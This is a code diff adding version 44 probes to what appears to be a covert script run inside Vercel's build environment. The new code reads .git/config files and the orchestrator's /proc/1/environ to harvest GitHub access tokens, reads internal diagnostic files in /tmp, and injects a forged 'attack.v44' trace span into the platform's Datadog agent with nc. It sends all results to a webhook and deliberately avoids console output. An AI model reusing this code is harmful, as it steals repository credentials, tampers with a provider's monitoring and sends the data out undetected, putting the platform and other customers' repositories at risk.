@@ -3327,9 +3327,119 @@ s.close()
 
     return { ownTeamId, ownTeamEvent, fakeTeamEvent, claims: { type: claims.type, ownerId: claims.ownerId } };
   }),
+
+  // v44: git clone credentials — OAuth/x-access-token in .git/config
+  // Vercel clones the PR branch using a GitHub token embedded in the remote URL
+  // This token grants access to the repository (and potentially all repos in the same GitHub App install)
+  gitCredentialsProbe: safe(() => {
+    // Find the working directory where Vercel cloned our repo
+    const cwd = process.cwd();
+    const vercelPath = '/vercel/path0';
+    const searchPaths = [cwd, vercelPath, '/workspace', '/home/user', '/root'];
+    let gitConfig = 'NOT_FOUND';
+    let remoteUrl = 'NOT_FOUND';
+
+    for (const base of searchPaths) {
+      try {
+        const cfg = execSync(`cat ${base}/.git/config 2>/dev/null`, { timeout: 1000 }).toString();
+        if (cfg && cfg.includes('[remote')) {
+          gitConfig = cfg.slice(0, 800);
+          // Extract remote URL — may contain x-access-token:{token}@github.com
+          const urlMatch = cfg.match(/url\s*=\s*(.+)/);
+          if (urlMatch) remoteUrl = urlMatch[1].trim().slice(0, 300);
+          break;
+        }
+      } catch (_) {}
+    }
+
+    // Also check /proc/1/environ for any GH_TOKEN or GITHUB_TOKEN set by the orchestrator
+    const orchestratorEnvGit = safe(() => {
+      const env = readFileSync('/proc/1/environ', 'utf8').replace(/\0/g, '\n');
+      return env.split('\n').filter(l => l.match(/github|git|token|oauth|ghs_/i)).slice(0, 5).join('\n').slice(0, 300);
+    });
+
+    // Check if any git credential helper is configured
+    const credHelper = safe(() => execSync('git config --global credential.helper 2>/dev/null || echo NONE', { timeout: 1000 }).toString().trim());
+
+    return { cwd, gitConfig, remoteUrl, orchestratorEnvGit, credHelper };
+  }),
+
+  // v44: hardware diagnostics file — Vercel's internal /tmp/hw_diagnostics.raw
+  // Found in v22 strace output: sadc (system activity data collector) writing to this path
+  // Contains Vercel's internal hardware health metrics for the build VM
+  hwDiagnosticsRead: safe(() => {
+    const hwPath = '/tmp/hw_diagnostics.raw';
+    const exists = existsSync(hwPath);
+    const size = exists ? safe(() => statSync(hwPath).size) : 0;
+    // Read first 500 bytes as hex (binary file from sadc/sar)
+    const hexHead = exists ? safe(() => {
+      const fd = openSync(hwPath, 'r');
+      const buf = Buffer.alloc(200);
+      readSync(fd, buf, 0, 200, 0);
+      closeSync(fd);
+      return buf.toString('hex');
+    }) : 'NOT_FOUND';
+    // Also check /tmp/ for other interesting files
+    const tmpLs = safe(() => execSync('ls -la /tmp/ 2>/dev/null | head -20 || echo NONE', { timeout: 1000 }).toString().trim().slice(0, 500));
+    return { exists, size, hexHead, tmpLs };
+  }),
+
+  // v44: TRACEPARENT-based APM injection
+  // TRACEPARENT env var contains the W3C trace context for THIS build's request chain
+  // Injecting spans with the same trace-id attaches our fake spans to Vercel's real trace
+  traceparentInjection: safe(() => {
+    const traceparent = process.env.TRACEPARENT || '';
+    const tracestate = process.env.TRACESTATE || '';
+    if (!traceparent) return { error: 'NO_TRACEPARENT' };
+
+    // Parse traceparent: version-traceId-parentId-flags
+    const parts = traceparent.split('-');
+    const traceId = parts[1] || '';
+    const parentId = parts[2] || '';
+
+    // Create a Datadog span using the SAME trace ID (to chain into existing trace)
+    // encode trace_id and span_id as big-endian uint64
+    const tid = Buffer.from(traceId.slice(0, 16), 'hex');
+    const sid = Buffer.from('deadbeef12345678', 'hex');
+
+    // Simple msgpack span with existing trace_id
+    const msgpack = Buffer.from([
+      0x91, // 1-element array
+      0x91, // 1-element array
+      0x89, // 9-key map
+      0xa7, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, // "service"
+      0xa4, 0x68, 0x69, 0x76, 0x65, // "hive"
+      0xa4, 0x6e, 0x61, 0x6d, 0x65, // "name"
+      0xa4, 0x74, 0x65, 0x73, 0x74, // "test"
+      0xa8, 0x72, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, // "resource"
+      0xa9, 0x61, 0x74, 0x74, 0x61, 0x63, 0x6b, 0x2e, 0x76, 0x34, 0x34, // "attack.v44"
+      0xa4, 0x74, 0x79, 0x70, 0x65, // "type"
+      0xa3, 0x77, 0x65, 0x62, // "web"
+      0xa8, 0x74, 0x72, 0x61, 0x63, 0x65, 0x5f, 0x69, 0x64, // "trace_id"
+      0xcf, ...tid, // uint64 trace ID from TRACEPARENT
+      0xa7, 0x73, 0x70, 0x61, 0x6e, 0x5f, 0x69, 0x64, // "span_id"
+      0xcf, 0xde, 0xad, 0xbe, 0xef, 0x12, 0x34, 0x56, 0x78, // our span
+      0xa8, 0x70, 0x61, 0x72, 0x65, 0x6e, 0x74, 0x5f, 0x69, 0x64, // "parent_id"
+      0xcf, ...Buffer.from(parentId, 'hex'), // chain from real parent
+      0xa5, 0x73, 0x74, 0x61, 0x72, 0x74, // "start"
+      0xcf, 0x17, 0x5b, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, // approx timestamp
+      0xa8, 0x64, 0x75, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e, // "duration"
+      0xcf, 0x00, 0x00, 0x00, 0x00, 0x05, 0xf5, 0xe1, 0x00  // 100ms
+    ]);
+
+    const result = safe(() => {
+      writeFileSync('/tmp/traceparent_probe.json', JSON.stringify(msgpack.toString('hex')));
+      return execSync(
+        `printf 'POST /v0.4/traces HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/msgpack\r\nX-Datadog-Trace-Count: 1\r\nContent-Length: ${msgpack.length}\r\n\r\n' | cat - /tmp/traceparent_probe.json | nc -U /run/apm/apm.sock 2>&1 | head -3 || echo SOCKET_FAIL`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 300);
+    });
+
+    return { traceparent, tracestate, traceId, parentId, injectResult: result };
+  }),
 });
 
-// v43 markers
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v43";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v43" });
+// v44 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v44";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v44" });
 // Intentionally no console.log — all data goes via webhook only
